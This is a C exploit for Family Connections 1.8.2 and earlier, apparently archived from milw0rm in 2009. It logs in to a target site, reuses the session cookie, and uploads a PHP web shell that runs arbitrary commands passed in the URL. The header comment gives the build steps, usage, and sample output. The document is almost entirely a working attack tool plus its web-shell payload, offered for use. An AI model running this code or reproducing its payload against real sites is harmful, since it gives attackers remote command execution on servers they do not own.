<html><head><title>Family Connections <= 1.8.2 Remote Shell Upload Exploit</title></head><pre>/*

	Family Connections &lt;= 1.8.2 - Remote Shell Upload Exploit
	
	Author: Salvatore &quot;drosophila&quot; Fresta
	
	Contact: drosophilaxxx@gmail.com
	
	Date: 3 April 2009

	The following software will upload a simple php shell.
	To execute remote commands, you must open the file 
	using a browser.
	
	gcc rsue.c -o rsue
	
	./rsue localhost /fcms/ user password

	[*] Connecting...
	[+] Connected
	[*] Send login...
	[+] Login Successful
	[+] Uploading...
	[+] Shell uploaded
	[+] Connection closed
	
	Open your browser and go to http://localhost/fcms/gallery/documents/shell.php?cmd=[commands]

*/	

#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;

int socket_connect(char *server, int port) {

	int fd;
	struct sockaddr_in sock;
	struct hostent *host;
	
	memset(&amp;sock, 0, sizeof(sock));
	
	if((fd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0) return -1;
	
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	
	if(!(host=gethostbyname(server))) return -1;
	
	sock.sin_addr = *((struct in_addr *)host-&gt;h_addr);
	
	if(connect(fd, (struct sockaddr *) &amp;sock, sizeof(sock)) &lt; 0) return -1;
	
	return fd;
   
}

int socket_send(int socket, char *buffer, size_t size) {
	
	if(socket &lt; 0) return -1;

	return write(socket, buffer, size) &lt; 0 ? -1 : 0;
	
}

char *socket_receive(int socket, int tout) {

	fd_set input;
	int ret, byte;
	char *buffer, *tmp;
	struct timeval timeout;
	
	FD_ZERO(&amp;input);
	FD_SET(socket, &amp;input);
	
	if(tout &gt; 0) {
			timeout.tv_sec  = tout;
			timeout.tv_usec = 0;
	}
	
	if(socket &lt; 0) return NULL;
	
	if(!(buffer = (char *) calloc (0, sizeof (char)))) return NULL;
	
	while (1) {
	
		if(tout &gt; 0)
			ret = select(socket + 1, &amp;input, NULL, NULL, &amp;timeout);
	else
			ret = select(socket + 1, &amp;input, NULL, NULL, NULL);
	
	if (!ret) break;
	if (ret &lt; 0) return NULL;
	
	if(!(tmp = (char *) calloc (1024, sizeof (char)))) return NULL;
	
	if ((byte=read(socket, tmp, 1024)) &lt; 0) return NULL;
	
		if(!byte) break;
	
	if(!(buffer = (char *) realloc(buffer, strlen (buffer) + strlen (tmp)))) return NULL;
	
	strncat(buffer, tmp, strlen(buffer)+strlen(tmp));
	
	}
	
	return buffer;
   
}

void usage(char *bn) {

	printf(&quot;\nFamily Connections &lt;= 1.8.2 - Remote Shell Upload Exploit\n&quot;
			&quot;Author: Salvatore \&quot;drosophila\&quot; Fresta\n\n&quot;
			&quot;usage: %s &lt;server&gt; &lt;path&gt; &lt;username&gt; &lt;password&gt;\n&quot;
			&quot;example: %s localhost /fcms/ admin 123456\n\n&quot;, bn, bn);	

}

int main(int argc, char *argv[]) {
	
	int sd;
	char code[] = &quot;--AaB03x\r\n&quot;
					&quot;Content-Disposition: form-data; name=\&quot;doc\&quot;; filename=\&quot;shell.php\&quot;\r\n&quot;
					&quot;Content-Type: text/plain\r\n&quot;
					&quot;\r\n&quot;
					&quot;&lt;?php echo \&quot;&lt;pre&gt;\&quot;; system($_GET['cmd']); echo \&quot;&lt;/pre&gt;\&quot;?&gt;\r\n&quot;
					&quot;--AaB03x\r\n&quot;
					&quot;Content-Disposition: form-data; name=\&quot;desc\&quot;\r\n&quot;
					&quot;\r\n&quot;
					&quot;description\r\n&quot;
					&quot;--AaB03x\r\n&quot;
					&quot;Content-Disposition: form-data; name=\&quot;submitadd\&quot;\r\n&quot;
					&quot;\r\n&quot;
					&quot;Submit\r\n&quot;
					&quot;--AaB03x--\r\n&quot;,
		*buffer = NULL,
		*rec = NULL,
		*session = NULL;
		
	if(argc &lt; 5) {
		usage(argv[0]);
		return -1;
	}
	
	if(!(buffer = (char *)calloc(200+strlen(code)+strlen(argv[1])+strlen(argv[2])+strlen(argv[3])+strlen(argv[4]), sizeof(char)))) {
		perror(&quot;calloc&quot;);
		return -1;
	}
	
	sprintf(buffer, &quot;POST %sindex.php HTTP/1.1\r\n&quot;
					&quot;Host: %s\r\n&quot;
					&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;
					&quot;Content-Length: %d\r\n\r\nuser=%s&amp;pass=%s&amp;submit=Login&quot;, argv[2], argv[1], (strlen(argv[4])+strlen(argv[3])+24), argv[3], argv[4]);
	
					
	printf(&quot;\n[*] Connecting...&quot;);
	
	if((sd = socket_connect(argv[1], 80)) &lt; 0) {
		printf(&quot;[-] Connection failed!\n\n&quot;);
		free(buffer);
		return -1;
	}
	
	printf(&quot;\n[+] Connected&quot;
			&quot;\n[*] Send login...&quot;);
	
	if(socket_send(sd, buffer, strlen(buffer)) &lt; 0) {
		printf(&quot;[-] Sending failed!\n\n&quot;);
		free(buffer);
		close(sd);
		return -1;
	}
	
	if(!(rec = socket_receive(sd, 0))) {
		printf(&quot;[-] Receive failed!\n\n&quot;);
		free(buffer);
		close(sd);
		return -1;
	}
	
	if(!strstr(rec, &quot;Login Successful&quot;)) {
		printf(&quot;\n[-] Login Incorrect!\n\n&quot;);
		free(buffer);
		close(sd);
		return -1;
	}
	
	session = strstr(rec, &quot;PHPSESSID&quot;);
	session = strtok(session, &quot;;&quot;);
	
	if((sd = socket_connect(argv[1], 80)) &lt; 0) {
		printf(&quot;[-] Connection failed!\n\n&quot;);
		free(buffer);
		return -1;
	}
	
	printf(&quot;\n[+] Login Successful&quot;
			&quot;\n[+] Uploading...&quot;);
	
	sprintf(buffer, &quot;POST %sdocuments.php HTTP/1.1\r\n&quot;
					&quot;Host: %s\r\n&quot;
					&quot;Cookie: %s\r\n&quot;
					&quot;Content-type: multipart/form-data, boundary=AaB03x\r\n&quot;
					&quot;Content-Length: %d\r\n\r\n%s&quot;, argv[2], argv[1], session, strlen(code), code);
	
	if(socket_send(sd, buffer, strlen(buffer)) &lt; 0) {
		printf(&quot;[-] Sending failed!\n\n&quot;);
		free(buffer);
		close(sd);
		return -1;
	}
	
	if(!(rec = socket_receive(sd, 0))) {
		printf(&quot;[-] Receive failed!\n\n&quot;);
		free(buffer);
		close(sd);
		return -1;
	}
	
	if(!strstr(rec, &quot;Uploaded Successfully&quot;)) {
		printf(&quot;\n[-] Upload failed!\n\n&quot;);
		free(buffer);
		close(sd);
		return -1;
	}
	
	free(buffer);
	close(sd);
	
	printf(&quot;\n[+] Shell uploaded&quot;
			&quot;\n[+] Connection closed\n\n&quot;
			&quot;Open your browser and go to http://%s%sgallery/documents/shell.php?cmd=[commands]\n\n&quot;, argv[1], argv[2]);
	
	return 0;
	
}

// milw0rm.com [2009-04-03]</pre></html>